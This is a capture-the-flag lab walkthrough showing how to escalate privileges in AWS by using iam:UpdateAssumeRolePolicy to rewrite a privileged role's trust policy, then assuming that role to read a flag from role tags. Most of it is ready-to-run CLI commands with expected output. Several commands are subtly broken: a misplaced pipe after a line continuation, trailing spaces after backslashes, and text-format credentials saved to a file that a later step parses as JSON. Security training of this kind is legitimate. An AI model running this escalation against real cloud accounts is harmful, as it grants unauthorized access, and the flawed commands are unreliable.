# Walkthrough: UpdateAssumeRolePolicy Privilege Escalation

## Lab Objective

Learn how to identify and exploit the `iam:UpdateAssumeRolePolicy` permission to escalate privileges by modifying a role's trust policy to allow yourself to assume it.

## Scenario

You have been provided with access to an entry role with limited permissions. Your goal is to discover a privileged role, modify its trust policy to allow you to assume it, and then retrieve the flag using the role's permissions.

## Prerequisites

- AWS CLI installed and configured
- Role ARN from the lab deployment
- Basic understanding of AWS IAM roles and trust policies
- (Optional) jq for JSON parsing

## Key Concepts

### Trust Policy vs Permission Policy

- **Trust Policy** (Assume Role Policy): Controls **WHO** can assume the role
- **Permission Policy**: Controls **WHAT** the role can do

In this lab, you'll modify the **trust policy** to add your entry role as a trusted principal.

## Setup

### Step 1: Assume the Lab Entry Role

Assume the lab entry role using the role ARN provided by the lab deployment:

```bash
# Replace with your specific role ARN from the deployment output
ROLE_ARN="arn:aws:iam::ACCOUNT_ID:role/specter-lab-updateassumerolepolicy-entry"

# Assume the role and get temporary credentials
CREDS=$(aws sts assume-role --role-arn "$ROLE_ARN" --role-session-name lab-session --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | awk '{print $1}')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | awk '{print $2}')
export AWS_SESSION_TOKEN=$(echo $CREDS | awk '{print $3}')
export AWS_DEFAULT_REGION="us-east-1"
```

Verify your identity:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AROA...:lab-session",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-updateassumerolepolicy-entry/lab-session"
}
```

Note that your ARN shows `assumed-role` indicating you're using temporary credentials from the entry role.

Save your role ARN for later:
```bash
# Extract the role ARN (not the assumed role session ARN)
ENTRY_ROLE_ARN=$(aws sts get-caller-identity --query 'Arn' --output text | sed 's/:sts:/:iam:/' | sed 's/:assumed-role\//:role\//' | sed 's/\/lab-session$//')
echo "Your entry role ARN: $ENTRY_ROLE_ARN"
```

## Reconnaissance

### Step 2: Enumerate Current Permissions

Check your inline policies:

```bash
# Extract the role name from your assumed role session
ROLE_NAME=$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)
echo "Current role: $ROLE_NAME"

# List inline policies
aws iam list-role-policies --role-name $ROLE_NAME | jq

# Get the policy document
aws iam get-role-policy \
  --role-name $ROLE_NAME --policy-name specter-lab-updateassumerolepolicy-entry-policy | jq
```

You should see you have:
- Read permissions on your own role
- `iam:ListRoles`, `iam:GetRole` to discover roles
- `iam:UpdateAssumeRolePolicy` on a specific role (**escalation vector**)
- `sts:AssumeRole` to assume roles

### Step 3: Discover Roles

List all IAM roles in the account:

```bash
aws iam list-roles --query 'Roles[*].[RoleName,Arn,Description]' --output table | jq
```

Look for the privileged role:
```
specter-lab-updateassumerolepolicy-privileged
```

Save the role name:
```bash
TARGET_ROLE="specter-lab-updateassumerolepolicy-privileged"
```

### Step 4: Examine the Target Role

Get details about the target role:

```bash
aws iam get-role --role-name $TARGET_ROLE | jq
```

Pay attention to the `AssumeRolePolicyDocument` (the trust policy):

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Principal": { "AWS": "*" },
    "Action": "sts:AssumeRole"
  }]
}
```

**Key Finding**: The trust policy currently **denies** all principals from assuming the role!

### Step 5: Check the Role's Permissions

List the role's policies:

```bash
# List inline policies
aws iam list-role-policies --role-name $TARGET_ROLE | jq

# Get inline policy details
aws iam get-role-policy \ 
  --role-name $TARGET_ROLE --policy-name specter-lab-updateassumerolepolicy-privileged-policy | jq
```

You'll see the role has permission to read the flag from the IAM role tags!

### Step 6: Attempt to Assume the Role (Will Fail)

Try to assume the role with its current trust policy:

```bash
aws sts assume-role \ | jq
  --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/$TARGET_ROLE --role-session-name test-session
```

Expected error:
```
An error occurred (AccessDenied) when calling the AssumeRole operation:
User: arn:aws:iam::123456789012:user/specter-lab-updateassumerolepolicy-user
is not authorized to perform: sts:AssumeRole on resource: ...
```

**Key Finding**: You cannot assume the role with the current trust policy!

## Exploitation

### Step 7: Create a New Trust Policy

First, make sure your ENTRY_ROLE_ARN variable is set:

```bash
# If you haven't set it yet or it's empty, set it now
ENTRY_ROLE_ARN=$(aws sts get-caller-identity --query 'Arn' --output text | sed 's/:sts:/:iam:/' | sed 's/:assumed-role\//:role\//' | sed 's/\/lab-session$//')
echo "Your entry role ARN: $ENTRY_ROLE_ARN"
```

Make sure you see your role ARN printed before continuing!

Create a new trust policy that allows your entry role to assume the privileged role:

```bash
# Note: Using unquoted EOF to allow variable expansion
cat > new-trust-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "$ENTRY_ROLE_ARN"
    },
    "Action": "sts:AssumeRole"
  }]
}
EOF
```

**Verify the policy content** (make sure your role ARN appears, not `$ENTRY_ROLE_ARN`):
```bash
cat new-trust-policy.json
```

Expected output (with your actual role ARN):
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::123456789012:role/specter-lab-updateassumerolepolicy-entry"
    },
    "Action": "sts:AssumeRole"
  }]
}
```

**Important**: If you see `$ENTRY_ROLE_ARN` instead of your actual role ARN, the variable didn't expand. In that case, manually create the file:

```bash
# Alternative method - direct substitution
echo "{
  \"Version\": \"2012-10-17\",
  \"Statement\": [{
    \"Effect\": \"Allow\",
    \"Principal\": {
      \"AWS\": \"$(aws sts get-caller-identity --query 'Arn' --output text | sed 's/:sts:/:iam:/' | sed 's/:assumed-role\//:role\//' | sed 's/\/lab-session$//')\"
    },
    \"Action\": \"sts:AssumeRole\"
  }]
}" > new-trust-policy.json

# Verify again
cat new-trust-policy.json
```

### Step 8: Update the Trust Policy

Use `iam:UpdateAssumeRolePolicy` to modify the role's trust policy:

```bash
aws iam update-assume-role-policy \ 
  --role-name $TARGET_ROLE --policy-document file://new-trust-policy.json | jq
```

Verify the change:
```bash
aws iam get-role --role-name $TARGET_ROLE --query 'Role.AssumeRolePolicyDocument' | jq
```

You should see your entry role ARN in the trust policy now!

### Step 9: Assume the Modified Role

Now that you've modified the trust policy, assume the role:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws sts assume-role \ 
  --role-arn arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE --role-session-name escalation-session --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text > /tmp/assumed-role-creds.json

cat /tmp/assumed-role-creds.json
```


Save these temporary credentials:
```bash
read ROLE_ACCESS_KEY_ID ROLE_SECRET_ACCESS_KEY ROLE_SESSION_TOKEN <<< $(aws sts assume-role   --role-arn arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE   --role-session-name escalation-session   --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]'   --output text)
```

### Step 10: Configure AWS CLI with Role Credentials

Switch to the assumed role credentials:

```bash
export AWS_ACCESS_KEY_ID=$(cat /tmp/assumed-role-creds.json | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat /tmp/assumed-role-creds.json | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(cat /tmp/assumed-role-creds.json | jq -r '.Credentials.SessionToken')
```

Verify you're now acting as the role:

```bash
aws sts get-caller-identity | jq
```

Expected output:
```json
{
  "UserId": "AROA...:escalation-session",
  "Account": "123456789012",
  "Arn": "arn:aws:sts::123456789012:assumed-role/specter-lab-updateassumerolepolicy-privileged/escalation-session"
}
```

Notice the ARN shows you're using an **assumed-role** session!

## Capture the Flag

### Step 11: Retrieve the Flag

Now with the privileged role's credentials, retrieve the flag:

```bash
aws iam get-role --role-name specter-lab-updateassumerolepolicy-flag-holder --query 'Role.Tags[?Key==`flag`].Value'  | jq
```

Expected output:
```
SPECTER:upd4t3_trust_p0l1cy_pwn3d
```

To see the full congratulations message:

```bash
aws iam list-role-tags --role-name specter-lab-updateassumerolepolicy-flag-holder | jq
```

## Understanding the Attack

### Why This Works

1. **Separate Policies**: Trust policies and permission policies serve different purposes
2. **Trust Policy Controls Access**: The trust policy determines who can assume a role
3. **No Approval Required**: Trust policy updates happen immediately
4. **Powerful Permission**: `iam:UpdateAssumeRolePolicy` effectively grants access to all the role's permissions
5. **Persistent**: The modified trust policy persists until changed again

### Attack Flow

```
Entry Role (limited permissions)
    |
    | iam:UpdateAssumeRolePolicy
    |
Modify Trust Policy (add entry role as trusted principal)
    |
    | sts:AssumeRole
    |
Assume Privileged Role with Escalated Permissions
    |
    | Use role's permissions
    |
Access Sensitive Resources (Flag)
```

## Additional Resources

- [AWS IAM UpdateAssumeRolePolicy API](https://docs.aws.amazon.com/IAM/latest/APIReference/API_UpdateAssumeRolePolicy.html)
- [IAM Role Trust Policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_terms-and-concepts.html#iam-term-trust-policy)
- [How to Use Trust Policies with IAM Roles](https://aws.amazon.com/blogs/security/how-to-use-trust-policies-with-iam-roles/)
- [Assuming an IAM Role](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use.html)
- [Rhino Security Labs: AWS Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)